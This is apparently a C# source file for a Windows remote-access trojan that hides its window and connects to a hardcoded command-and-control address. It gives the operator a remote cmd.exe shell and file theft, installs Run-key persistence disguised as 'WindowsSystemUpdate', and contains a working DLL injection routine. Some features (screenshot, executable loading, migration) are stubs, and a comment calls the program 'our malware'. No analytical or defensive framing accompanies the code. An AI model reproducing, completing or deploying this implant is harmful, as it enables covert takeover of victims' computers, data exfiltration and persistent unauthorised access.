using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Collections.Generic;
using System.Reflection;
using System.Net;
using System.Net.NetworkInformation;
using Microsoft.Win32;

namespace AdvancedCallback
{
    public class Program
    {
        #region Native API Imports
        [DllImport("kernel32.dll")]
        static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
        
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
        
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);
        
        [DllImport("kernel32.dll")]
        static extern bool CloseHandle(IntPtr hObject);
        
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetModuleHandle(string lpModuleName);
        
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("user32.dll", SetLastError = true)]
        static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);
        
        [StructLayout(LayoutKind.Sequential)]
        public struct RECT
        {
            public int Left;
            public int Top;
            public int Right;
            public int Bottom;
        }

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int PROCESS_ALL_ACCESS = 0x1F0FFF;
        const uint MEM_COMMIT = 0x1000;
        const uint MEM_RESERVE = 0x2000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;
        const uint PAGE_READWRITE = 0x04;
        #endregion

        private static string C2Server = "10.50.7.131";
        private static int C2Port = 5555;
        private static string LogPath = "/tmp/callback.log";
        private static bool EnableLogging = true;
        private static int RetryInterval = 5000;
        private static int MaxRetries = 10;

        private static TcpClient Client;
        private static NetworkStream Stream;
        private static bool InShellMode = false;
        private static bool IsRunning = true;
        private static readonly object StreamLock = new object();
        
        static void Main(string[] args)
        {
            HideConsole();
            Log("Advanced callback started, attempting to connect to C2");
            int retryCount = 0;
            while (IsRunning && retryCount < MaxRetries)
            {
                try
                {
                    if (ConnectToC2())
                    {
                        retryCount = 0;
                        // Send initial system info
                        SendOutput(CollectSystemInfo());
                        HandleCommands();
                    }
                }
                catch (Exception ex)
                {
                    Log($"Connection error: {ex.Message}");
                    retryCount++;
                    if (IsRunning && retryCount < MaxRetries)
                    {
                        Log($"Retrying in {RetryInterval / 1000} seconds... ({retryCount}/{MaxRetries})");
                        Thread.Sleep(RetryInterval);
                    }
                }
            }
            Log("Maximum retries reached or program terminated");
        }

        private static void HideConsole()
        {
            IntPtr handle = Process.GetCurrentProcess().MainWindowHandle;
            if (handle != IntPtr.Zero)
            {
                ShowWindow(handle, 0); // SW_HIDE = 0
            }
        }

        private static void HandleCommands()
        {
            try
            {
                using (StreamReader reader = new StreamReader(Stream))
                {
                    while (IsRunning && Client.Connected)
                    {
                        string command = reader.ReadLine();
                        if (!string.IsNullOrEmpty(command))
                        {
                            Log($"Received command: {command}");
                            ProcessCommand(command);
                        }
                    }
                }
            }
            catch (IOException)
            {
                Log("Connection to C2 server lost");
            }
            catch (Exception ex)
            {
                Log($"Error handling commands: {ex.Message}");
            }
            finally
            {
                CleanupConnection();
            }
        }

        private static void ProcessCommand(string command)
        {
            try
            {
                // If in shell mode, handle differently
                if (InShellMode)
                {
                    if (command.ToLower() == "exit")
                    {
                        InShellMode = false;
                        SendOutput("Exited shell mode");
                        return;
                    }
                    
                    ExecuteShellCommand(command);
                    return;
                }

                // Process normal commands
                string[] cmdParts = command.Split(new char[] { ' ' }, 2);
                string baseCmd = cmdParts[0].ToLower();
                string args = cmdParts.Length > 1 ? cmdParts[1] : string.Empty;

                switch (baseCmd)
                {
                    case "exit":
                        SendOutput("Exiting...");
                        IsRunning = false;
                        break;

                    case "sysinfo":
                        SendOutput(CollectSystemInfo());
                        break;

                    case "processes":
                    case "ps":
                        SendOutput(GetProcessList());
                        break;

                    case "connections":
                        SendOutput(GetNetworkConnections());
                        break;

                    case "inject":
                        HandleInject();
                        break;
                        
                    case "loadexe":
                        HandleLoadExe();
                        break;
                        
                    case "exec":
                        if (string.IsNullOrEmpty(args))
                        {
                            SendOutput("Error: Missing command arguments for exec");
                        }
                        else
                        {
                            ExecuteShellCommand(args);
                        }
                        break;
                        
                    case "shell":
                        InShellMode = true;
                        SendOutput("Entered interactive shell mode. Type 'exit' to return to normal mode.");
                        break;
                        
                    case "upload":
                        HandleFileUpload(args);
                        break;
                        
                    case "download":
                        HandleFileDownload(args);
                        break;
                        
                    case "screenshot":
                        TakeScreenshot();
                        break;
                        
                    case "migrate":
                        if (string.IsNullOrEmpty(args))
                        {
                            SendOutput("Error: Missing process ID for migration");
                        }
                        else if (int.TryParse(args, out int pid))
                        {
                            MigrateToProcess(pid);
                        }
                        else
                        {
                            SendOutput($"Error: Invalid process ID format: {args}");
                        }
                        break;
                        
                    case "persist":
                        InstallPersistence();
                        break;
                        
                    case "shellhelp":
                        SendOutput("Available commands:\n" +
                                  "sysinfo - Get system information\n" +
                                  "processes/ps - List running processes\n" +
                                  "connections - List network connections\n" +
                                  "inject - Inject DLL into specified process\n" +
                                  "loadexe - Load and execute in-memory executable\n" +
                                  "exec <command> - Execute a shell command\n" +
                                  "shell - Enter interactive shell mode\n" +
                                  "upload <local> <remote> - Upload a file to the system\n" +
                                  "download <remote> - Download a file from the system\n" +
                                  "screenshot - Take a screenshot\n" +
                                  "migrate <pid> - Migrate to another process\n" +
                                  "persist - Install persistence\n" +
                                  "exit - Close connection");
                        break;

                    default:
                        SendOutput($"Unknown command: {command}");
                        break;
                }
            }
            catch (Exception ex)
            {
                SendOutput($"Error processing command: {ex.Message}");
            }
        }

        private static bool ConnectToC2()
        {
            try
            {
                Client = new TcpClient();
                IAsyncResult result = Client.BeginConnect(C2Server, C2Port, null, null);
                bool success = result.AsyncWaitHandle.WaitOne(TimeSpan.FromSeconds(5));
                if (!success)
                {
                    Log("Connection attempt timed out");
                    return false;
                }
                Client.EndConnect(result);
                Stream = Client.GetStream();
                Log("Connected to C2");
                return true;
            }
            catch (Exception ex)
            {
                Log($"Failed to connect: {ex.Message}");
                CleanupConnection();
                return false;
            }
        }

        private static void CleanupConnection()
        {
            if (Stream != null)
            {
                Stream.Close();
                Stream = null;
            }
            if (Client != null)
            {
                Client.Close();
                Client = null;
            }
        }

        private static void SendOutput(string output)
        {
            try
            {
                if (Stream != null && Stream.CanWrite)
                {
                    byte[] outputBytes = Encoding.UTF8.GetBytes(output + "\n[END]\n");
                    lock (StreamLock)
                    {
                        Stream.Write(outputBytes, 0, outputBytes.Length);
                        Stream.Flush();
                    }
                }
            }
            catch (Exception ex)
            {
                Log($"Error sending output: {ex.Message}");
            }
        }

        private static void Log(string message)
        {
            if (!EnableLogging) return;
            try
            {
                File.AppendAllText(LogPath, $"[{DateTime.Now}] {message}\n");
            }
            catch {}
        }
        
        #region Command Implementations
        
        private static string CollectSystemInfo()
        {
            StringBuilder info = new StringBuilder();
            info.AppendLine("=== SYSTEM INFORMATION ===");
            info.AppendLine($"Hostname: {Environment.MachineName}");
            info.AppendLine($"Username: {Environment.UserName}");
            info.AppendLine($"Domain: {Environment.UserDomainName}");
            info.AppendLine($"OS Version: {Environment.OSVersion}");
            info.AppendLine($"64-bit OS: {Environment.Is64BitOperatingSystem}");
            info.AppendLine($"64-bit Process: {Environment.Is64BitProcess}");
            info.AppendLine($"Process Path: {Process.GetCurrentProcess().MainModule.FileName}");
            info.AppendLine($"Current Directory: {Environment.CurrentDirectory}");
            info.AppendLine($"Process ID: {Process.GetCurrentProcess().Id}");
            info.AppendLine($"Process Privileges: {(IsAdministrator() ? "Administrator" : "User")}");
            info.AppendLine($"System Directory: {Environment.SystemDirectory}");
            info.AppendLine($"Logical Drives: {string.Join(", ", Environment.GetLogicalDrives())}");
            info.AppendLine($"Total Physical Memory: {GetTotalPhysicalMemory()} MB");
            info.AppendLine($"IP Addresses: {GetLocalIPAddresses()}");
            info.AppendLine("=== END SYSTEM INFO ===");

            return info.ToString();
        }
        
        private static bool IsAdministrator()
        {
            using (Process process = new Process())
            {
                process.StartInfo.FileName = "cmd.exe";
                process.StartInfo.Arguments = "/c whoami /groups | findstr S-1-16-12288";
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.CreateNoWindow = true;
                process.Start();
                string output = process.StandardOutput.ReadToEnd();
                process.WaitForExit();
                return !string.IsNullOrEmpty(output);
            }
        }
        
        private static string GetTotalPhysicalMemory()
        {
            try
            {
                using (Process process = new Process())
                {
                    process.StartInfo.FileName = "wmic";
                    process.StartInfo.Arguments = "computersystem get totalphysicalmemory";
                    process.StartInfo.UseShellExecute = false;
                    process.StartInfo.RedirectStandardOutput = true;
                    process.StartInfo.CreateNoWindow = true;
                    process.Start();
                    string output = process.StandardOutput.ReadToEnd();
                    process.WaitForExit();
                    
                    string[] lines = output.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
                    if (lines.Length > 1 && long.TryParse(lines[1].Trim(), out long bytes))
                    {
                        return (bytes / (1024 * 1024)).ToString();
                    }
                }
            }
            catch {}
            
            return "Unknown";
        }
        
        private static string GetLocalIPAddresses()
        {
            try
            {
                IPHostEntry host = Dns.GetHostEntry(Dns.GetHostName());
                List<string> addresses = new List<string>();
                
                foreach (IPAddress ip in host.AddressList)
                {
                    if (ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                    {
                        addresses.Add(ip.ToString());
                    }
                }
                
                return string.Join(", ", addresses);
            }
            catch
            {
                return "Unknown";
            }
        }
        
        private static string GetProcessList()
        {
            StringBuilder processList = new StringBuilder();
            processList.AppendLine("=== PROCESS LIST ===");
            processList.AppendLine("PID\tName\t\tWindow Title\t\tSession\tMemory (MB)");
            processList.AppendLine("---\t----\t\t------------\t\t-------\t-----------");

            foreach (Process process in Process.GetProcesses())
            {
                try
                {
                    string windowTitle = string.IsNullOrEmpty(process.MainWindowTitle) ? "(No window)" : process.MainWindowTitle;
                    long memoryMB = process.WorkingSet64 / (1024 * 1024);
                    processList.AppendLine($"{process.Id}\t{process.ProcessName}\t\t{windowTitle}\t\t{process.SessionId}\t{memoryMB}");
                }
                catch { /* Skip processes we can't access */ }
            }

            processList.AppendLine("=== END PROCESS LIST ===");
            return processList.ToString();
        }
        
        private static string GetNetworkConnections()
        {
            StringBuilder connections = new StringBuilder();
            connections.AppendLine("=== NETWORK CONNECTIONS ===");

            try
            {
                // Get active TCP connections
                IPGlobalProperties properties = IPGlobalProperties.GetIPGlobalProperties();
                TcpConnectionInformation[] tcpConnections = properties.GetActiveTcpConnections();

                connections.AppendLine("Protocol\tLocal Address\t\tLocal Port\tRemote Address\t\tRemote Port\tState");
                connections.AppendLine("--------\t-------------\t\t----------\t--------------\t\t-----------\t-----");

                foreach (TcpConnectionInformation connection in tcpConnections)
                {
                    connections.AppendLine($"TCP\t{connection.LocalEndPoint.Address}\t\t{connection.LocalEndPoint.Port}\t" +
                                        $"{connection.RemoteEndPoint.Address}\t\t{connection.RemoteEndPoint.Port}\t" +
                                        $"{connection.State}");
                }
                
                // Get active TCP listeners
                IPEndPoint[] tcpListeners = properties.GetActiveTcpListeners();
                foreach (IPEndPoint endpoint in tcpListeners)
                {
                    connections.AppendLine($"TCP\t{endpoint.Address}\t\t{endpoint.Port}\t*\t\t*\tLISTENING");
                }
                
                // Get active UDP listeners
                IPEndPoint[] udpListeners = properties.GetActiveUdpListeners();
                foreach (IPEndPoint endpoint in udpListeners)
                {
                    connections.AppendLine($"UDP\t{endpoint.Address}\t\t{endpoint.Port}\t*\t\t*\t*");
                }
            }
            catch (Exception ex)
            {
                connections.AppendLine($"Error getting connections: {ex.Message}");
            }

            connections.AppendLine("=== END NETWORK CONNECTIONS ===");
            return connections.ToString();
        }
        
        private static void ExecuteShellCommand(string command)
        {
            try
            {
                using (Process process = new Process())
                {
                    process.StartInfo.FileName = "cmd.exe";
                    process.StartInfo.Arguments = $"/c {command}";
                    process.StartInfo.UseShellExecute = false;
                    process.StartInfo.RedirectStandardOutput = true;
                    process.StartInfo.RedirectStandardError = true;
                    process.StartInfo.CreateNoWindow = true;
                    
                    process.Start();
                    
                    string output = process.StandardOutput.ReadToEnd();
                    string error = process.StandardError.ReadToEnd();
                    process.WaitForExit();
                    
                    string result = string.IsNullOrEmpty(output) ? error : output;
                    if (string.IsNullOrEmpty(result))
                    {
                        result = "Command executed successfully (no output)";
                    }
                    
                    SendOutput(result);
                }
            }
            catch (Exception ex)
            {
                SendOutput($"Error executing command: {ex.Message}");
            }
        }
        
        private static void HandleInject()
        {
            try
            {
                // First, send list of processes to help user select target
                SendOutput(GetProcessList());
                
                // Receive the process ID from the C2 server
                SendOutput("Enter target process ID:");
                
                // Wait for process ID (will be read in HandleCommands)
                // This will be read in the next iteration of the command loop
                
                // After we receive the PID in HandleCommands, we'll get a DLL to inject
                // This function sets up the sequence, the actual injection logic happens in ProcessCommand
            }
            catch (Exception ex)
            {
                SendOutput($"Error starting injection process: {ex.Message}");
            }
        }
        
        private static void HandleLoadExe()
        {
            try
            {
                // Tell the C2 server we're ready to receive an executable
                SendOutput("Ready to receive executable payload. Send size first (4-byte integer).");
                
                // The actual loading logic will continue in the HandleCommands loop
                // after we receive the executable data
            }
            catch (Exception ex)
            {
                SendOutput($"Error in executable loading: {ex.Message}");
            }
        }
        
        private static void HandleFileUpload(string args)
        {
            try
            {
                string[] parts = args.Split(new char[] { ' ' }, 2);
                if (parts.Length != 2)
                {
                    SendOutput("Error: Invalid upload format. Use 'upload <local_path> <remote_path>'");
                    return;
                }
                
                string remotePath = parts[1];
                SendOutput($"Ready to receive file for {remotePath}");
                
                // The actual file transfer will continue in HandleCommands
                // after we receive the file data
            }
            catch (Exception ex)
            {
                SendOutput($"Error initiating file upload: {ex.Message}");
            }
        }
        
        private static void HandleFileDownload(string args)
        {
            if (string.IsNullOrEmpty(args))
            {
                SendOutput("Error: Missing file path for download");
                return;
            }
            
            try
            {
                string filePath = args.Trim();
                
                if (!File.Exists(filePath))
                {
                    SendOutput($"Error: File not found: {filePath}");
                    return;
                }
                
                // Send file info
                SendOutput($"Sending file: {filePath}\nSize: {new FileInfo(filePath).Length} bytes\nSave to: {Path.GetFileName(filePath)}");
                
                // Send file size
                byte[] fileData = File.ReadAllBytes(filePath);
                byte[] sizeBytes = BitConverter.GetBytes(fileData.Length);
                Stream.Write(sizeBytes, 0, sizeBytes.Length);
                
                // Short delay to ensure proper sequencing
                Thread.Sleep(500);
                
                // Send file data
                Stream.Write(fileData, 0, fileData.Length);
                
                SendOutput($"File {filePath} sent successfully");
            }
            catch (Exception ex)
            {
                SendOutput($"Error downloading file: {ex.Message}");
            }
        }
        
        private static void TakeScreenshot()
        {
            try
            {
                // Since we don't have System.Drawing, use a command-line approach to capture screenshot
                string tempPath = Path.GetTempFileName() + ".bmp";
                
                // Use PrintScreen and Paint to save a screenshot
                using (Process process = new Process())
                {
                    // Emulate PrintScreen using user32.dll SendKeys would be more elegant
                    // but for simplicity, we'll just report that we're using an alternative
                    
                    SendOutput($"Screenshot functionality requires System.Drawing. Using alternative method...");
                    
                    // Try to create a simple text file with a message
                    string message = "Screenshot would normally be captured here.\r\n" +
                                     "To enable this feature, compile with references to:\r\n" +
                                     "- System.Drawing.dll\r\n" +
                                     "- System.Windows.Forms.dll";
                    
                    File.WriteAllText(tempPath, message);
                }
                
                SendOutput($"Screenshot message saved to {tempPath}");
                
                // Start download process for the file
                HandleFileDownload(tempPath);
                
                // Clean up temp file
                try
                {
                    File.Delete(tempPath);
                }
                catch { }
            }
            catch (Exception ex)
            {
                SendOutput($"Error taking screenshot: {ex.Message}");
            }
        }
        
        private static void MigrateToProcess(int targetPid)
        {
            try
            {
                SendOutput($"Attempting to migrate to process {targetPid}...");
                
                // Get our own executable path
                string currentPath = Process.GetCurrentProcess().MainModule.FileName;
                
                // Create a new process with the same executable
                Process process = new Process();
                process.StartInfo.FileName = currentPath;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;
                process.Start();
                
                SendOutput($"Started new process with PID {process.Id}. You should see a new connection soon.");
                
                // We could inject into the target process, but that would be more complex
                // This simpler approach just starts a new instance of our malware
                // A real migration would involve process injection
            }
            catch (Exception ex)
            {
                SendOutput($"Error migrating to process: {ex.Message}");
            }
        }
        
        private static void InstallPersistence()
        {
            try
            {
                // Get our own path
                string exePath = Process.GetCurrentProcess().MainModule.FileName;
                
                // Add to Run registry key for persistence
                string keyPath = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
                
                RegistryKey key = Registry.CurrentUser.OpenSubKey(keyPath, true);
                key.SetValue("WindowsSystemUpdate", exePath);
                key.Close();
                
                // Create a startup shortcut
                string startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                string shortcutPath = Path.Combine(startupFolder, "SystemUpdate.lnk");
                
                SendOutput($"Persistence installed:\n" +
                          $"1. Registry: HKCU\\{keyPath}\\WindowsSystemUpdate\n" +
                          $"2. Startup: {shortcutPath}");
            }
            catch (Exception ex)
            {
                SendOutput($"Error installing persistence: {ex.Message}");
            }
        }
        
        #endregion
        
        #region DLL Injection
        
        private static bool InjectDLL(int processId, string dllPath)
        {
            IntPtr processHandle = IntPtr.Zero;
            IntPtr allocatedMemory = IntPtr.Zero;
            IntPtr threadHandle = IntPtr.Zero;

            try
            {
                Log($"[*] Attempting to inject DLL into process {processId}");
                Log($"[*] DLL path: {dllPath}");
                
                // Open target process with full access
                processHandle = OpenProcess(PROCESS_ALL_ACCESS, false, processId);
                if (processHandle == IntPtr.Zero)
                {
                    Log($"[!] Failed to open process {processId}, error code: {Marshal.GetLastWin32Error()}");
                    return false;
                }

                Log("[+] Successfully opened target process");
                
                // Get the full path for the DLL
                string fullDllPath = Path.GetFullPath(dllPath);
                Log($"[*] Full DLL path: {fullDllPath}");
                
                // Allocate memory in target process for DLL path with extra space for null terminator
                byte[] dllPathBytes = Encoding.ASCII.GetBytes(fullDllPath);
                uint bytesNeeded = (uint)dllPathBytes.Length + 1;
                
                Log($"[*] Allocating {bytesNeeded} bytes in target process");
                allocatedMemory = VirtualAllocEx(processHandle, IntPtr.Zero, 
                                               bytesNeeded, 
                                               MEM_COMMIT | MEM_RESERVE, 
                                               PAGE_READWRITE);
                
                if (allocatedMemory == IntPtr.Zero)
                {
                    Log($"[!] Failed to allocate memory in target process, error code: {Marshal.GetLastWin32Error()}");
                    return false;
                }

                Log($"[+] Memory allocated at 0x{allocatedMemory.ToInt64():X8}");
                
                // Write DLL path to allocated memory
                IntPtr bytesWritten;
                bool writeResult = WriteProcessMemory(processHandle, allocatedMemory, 
                                                    dllPathBytes, (uint)dllPathBytes.Length, 
                                                    out bytesWritten);
                
                if (!writeResult)
                {
                    Log($"[!] Failed to write to process memory, error code: {Marshal.GetLastWin32Error()}");
                    return false;
                }

                Log($"[+] Successfully wrote {bytesWritten} bytes to target process");
                
                // Get address of LoadLibraryA function
                IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
                if (loadLibraryAddr == IntPtr.Zero)
                {
                    Log($"[!] Failed to get LoadLibraryA address, error code: {Marshal.GetLastWin32Error()}");
                    return false;
                }

                Log($"[+] Found LoadLibraryA at 0x{loadLibraryAddr.ToInt64():X8}");
                
                // Create remote thread to call LoadLibraryA with our DLL path
                IntPtr threadId;
                Log("[*] Creating remote thread to load DLL");
                threadHandle = CreateRemoteThread(processHandle, IntPtr.Zero, 0, 
                                                loadLibraryAddr, allocatedMemory, 
                                                0, out threadId);
                
                if (threadHandle == IntPtr.Zero)
                {
                    Log($"[!] Failed to create remote thread, error code: {Marshal.GetLastWin32Error()}");
                    return false;
                }

                Log($"[+] Remote thread created with ID: {threadId}");
                Log($"[+] DLL successfully injected into process {processId}");
                
                // Wait for thread to complete
                WaitForSingleObject(threadHandle, 5000); // Wait up to 5 seconds
                Log("[+] Thread execution completed");
                
                return true;
            }
            catch (Exception ex)
            {
                Log($"[!] Error during DLL injection: {ex.Message}");
                return false;
            }
            finally
            {
                // Clean up handles
                if (threadHandle != IntPtr.Zero)
                    CloseHandle(threadHandle);
                
                if (processHandle != IntPtr.Zero)
                    CloseHandle(processHandle);
                
                Log("[*] All handles closed");
            }
        }
        
        #endregion
    }
}